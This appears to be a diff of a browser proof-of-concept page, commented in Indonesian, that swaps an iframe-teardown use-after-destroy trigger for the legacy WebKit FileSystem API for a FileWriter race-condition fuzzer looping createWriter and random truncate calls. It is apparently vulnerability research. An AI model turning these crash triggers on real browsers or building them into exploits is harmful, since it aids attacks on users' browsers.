@@ -2,119 +2,162 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FileSystem Use-After-Destroy PoC</title>
+    <title>FileWriter Unvalidated Length PoC</title>
     <style>
-        body { font-family: monospace; padding: 20px; background: #f0f0f0; }
-        #log { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; border: 1px solid #333; }
-        .status { color: yellow; font-weight: bold; }
-        .error { color: red; }
-        button { padding: 10px 20px; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        body { font-family: 'Consolas', monospace; padding: 20px; background: #222; color: #ddd; }
+        #console { background: #000; border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; font-size: 12px; }
+        .log-info { color: #0f0; }
+        .log-warn { color: #ff0; }
+        .log-error { color: #f00; }
+        .log-crit { color: #f0f; font-weight: bold; }
+        button { padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
+        button#start { background: #006400; color: white; border: none; }
+        button#stop { background: #8b0000; color: white; border: none; }
     </style>
 </head>
 <body>
 
-    <h1>FileSystem Callback Lifecycle Bug Trigger</h1>
-    <p>Mencoba memicu <code>DidOpenFileSystem</code> setelah <code>ExecutionContext</code> hancur.</p>
+    <h2>FileWriter::Initialize Length Race Condition</h2>
+    <p>Mencoba memicu <code>DidCreateFileWriter</code> dengan metadata file yang tidak stabil.</p>
     
-    <button onclick="startFuzzing()">Mulai Stress Test (Race Condition)</button>
-    <button onclick="stopFuzzing()" style="background:#ccc;">Stop</button>
-    
-    <div id="log"></div>
+    <div>
+        <button id="start" onclick="startAttack()">Start Fuzzing</button>
+        <button id="stop" onclick="stopAttack()">Stop</button>
+        <span id="status">Status: Idle</span>
+    </div>
+    <br>
+    <div id="console"></div>
 
     <script>
         let isRunning = false;
+        let fs = null;
+        let fileEntry = null;
         let iteration = 0;
-        const logDiv = document.getElementById('log');
+        const consoleDiv = document.getElementById('console');
+        const statusSpan = document.getElementById('status');
 
-        function log(msg, type = '') {
-            const div = document.createElement('div');
-            div.textContent = `[${iteration}] ${msg}`;
-            if (type) div.className = type;
-            logDiv.appendChild(div);
-            logDiv.scrollTop = logDiv.scrollHeight;
+        function log(msg, type = 'log-info') {
+            const line = document.createElement('div');
+            line.className = type;
+            line.textContent = `> ${msg}`;
+            consoleDiv.appendChild(line);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
-        // Langkah 1: Minta Quota dulu agar API benar-benar melakukan kerja (IPC)
-        async function requestQuota() {
-            return new Promise((resolve) => {
-                if (navigator.webkitPersistentStorage) {
-                    navigator.webkitPersistentStorage.requestQuota(10 * 1024 * 1024, resolve);
-                } else {
-                    // Fallback untuk browser modern yang mungkin sudah menghapus API ini
-                    resolve(0); 
+        // 1. Setup FileSystem (Legacy API)
+        async function initFS() {
+            return new Promise((resolve, reject) => {
+                if (!window.webkitRequestFileSystem) {
+                    log("ERROR: WebKit File System API not supported in this browser.", "log-error");
+                    reject("API Not Supported");
+                    return;
                 }
+                
+                // Request 10MB Temporary Storage
+                window.webkitRequestFileSystem(window.TEMPORARY, 10 * 1024 * 1024, (filesystem) => {
+                    fs = filesystem;
+                    log("FileSystem acquired.", "log-info");
+                    
+                    // Create or get a test file
+                    fs.root.getFile('fuzz_target.dat', { create: true }, (entry) => {
+                        fileEntry = entry;
+                        log("Target file ready: fuzz_target.dat", "log-info");
+                        resolve();
+                    }, (e) => reject(e));
+                }, (e) => reject(e));
             });
         }
 
-        async function startFuzzing() {
+        async function startAttack() {
             if (isRunning) return;
             isRunning = true;
-            iteration = 0;
-            log("Meminta Quota Storage...", "status");
-            
-            await requestQuota();
-            log("Quota didapat. Memulai loop race condition...", "status");
+            statusSpan.textContent = "Status: RUNNING";
+            statusSpan.style.color = "#0f0";
+            document.getElementById('start').disabled = true;
 
+            try {
+                await initFS();
+                log("Starting Race Condition Loop...", "log-warn");
+                loopAttack();
+            } catch (e) {
+                log("Initialization failed: " + e, "log-error");
+                isRunning = false;
+            }
+        }
+
+        function stopAttack() {
+            isRunning = false;
+            statusSpan.textContent = "Status: STOPPED";
+            statusSpan.style.color = "#f00";
+            document.getElementById('start').disabled = false;
+            log("Attack stopped by user.", "log-error");
+        }
+
+        // 2. The Attack Loop
+        async function loopAttack() {
             while (isRunning) {
                 iteration++;
-                triggerRace();
                 
-                // Delay sangat kecil untuk membiarkan event loop berdenyut tapi tetap cepat
+                // Jalankan dua aksi secara paralel untuk memicu race condition
+                // 1. Minta Writer (yang akan memanggil DidCreateFileWriter)
+                const writerPromise = getWriter();
+                
+                // 2. Ubah ukuran file secara acak (memaksa backend update metadata)
+                const truncatePromise = truncateFileRandomly();
+
+                await Promise.allSettled([writerPromise, truncatePromise]);
+
+                // Delay sangat singkat agar event loop tidak macet tapi race tetap mungkin
                 await new Promise(r => setTimeout(r, 0)); 
             }
         }
 
-        function stopFuzzing() {
-            isRunning = false;
-            log("Dihentikan.", "error");
+        // Aksi A: Meminta FileWriter (Entry point ke DidCreateFileWriter)
+        function getWriter() {
+            return new Promise((resolve) => {
+                if (!fileEntry) return resolve();
+                
+                fileEntry.createWriter(
+                    (writer) => {
+                        // Jika berhasil dapat writer, segera coba truncate lagi
+                        // Ini membebani inisialisasi internal
+                        try {
+                            // Mencoba truncate ke nilai besar atau negatif (jika JS mengizinkan)
+                            // JS biasanya memblokir negatif, tapi kita coba batas integer
+                            writer.truncate(0); 
+                        } catch(e) {}
+                        resolve();
+                    },
+                    (e) => {
+                        // Error biasa dalam race condition
+                        resolve(); 
+                    }
+                );
+            });
         }
 
-        function triggerRace() {
-            // 1. Buat iframe baru (ExecutionContext baru)
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            const win = iframe.contentWindow;
-            const doc = iframe.contentDocument;
+        // Aksi B: Mengacaukan Metadata File
+        function truncateFileRandomly() {
+            return new Promise((resolve) => {
+                if (!fileEntry) return resolve();
 
-            // 2. Inject script ke dalam iframe untuk memanggil API FileSystem
-            // Kita menggunakan string function agar scope-nya terisolasi di iframe
-            const scriptCode = `
-                (function() {
-                    try {
-                        // Ini akan memanggil FileSystemCallbacks::DidOpenFileSystem secara async
-                        window.webkitRequestFileSystem(window.TEMPORARY, 1024, 
-                            function success(fs) {
-                                // JIKA BUG TERJADI:
-                                // Callback ini dipanggil setelah context hancur.
-                                // Akses ke 'fs' atau pembuatan wrapper V8 bisa crash.
-                                console.log("Callback fired on dead context!"); 
-                            }, 
-                            function error(e) {
-                                // Ignore errors
-                            }
-                        );
-                    } catch(e) {}
-                })();
-            `;
-
-            // 3. Eksekusi script di dalam iframe
-            const scriptEl = doc.createElement('script');
-            scriptEl.textContent = scriptCode;
-            doc.body.appendChild(scriptEl);
-
-            // 4. THE KILL SWITCH: Hancurkan ExecutionContext SEGERA
-            // Kita melakukan navigasi ke about:blank atau menghapus iframe.
-            // Ini memicu teardown ExecutionContext di Blink.
-            
-            // Opsi A: Navigasi (Lebih agresif untuk teardown context)
-            iframe.src = 'about:blank';
-            
-            // Opsi B: Hapus dari DOM (Terkadang context masih hidup sebentar karena GC)
-            // document.body.removeChild(iframe); 
-
-            log(`Triggered #${iteration} - Context Destroyed`);
+                fileEntry.createWriter(
+                    (writer) => {
+                        // Generate ukuran acak. 
+                        // Catatan: JS tidak bisa mengirim int64 negatif ke API ini secara langsung,
+                        // tapi kita bisa mencoba nilai maksimum atau 0 berulang kali.
+                        const randomSize = Math.floor(Math.random() * 1024 * 100); 
+                        
+                        writer.onwriteend = () => resolve();
+                        writer.onerror = () => resolve();
+                        
+                        try {
+                            writer.truncate(randomSize);
+                        } catch(e) { resolve(); }
+                    },
+                    (e) => resolve()
+                );
+            });
         }
     </script>
 </body>
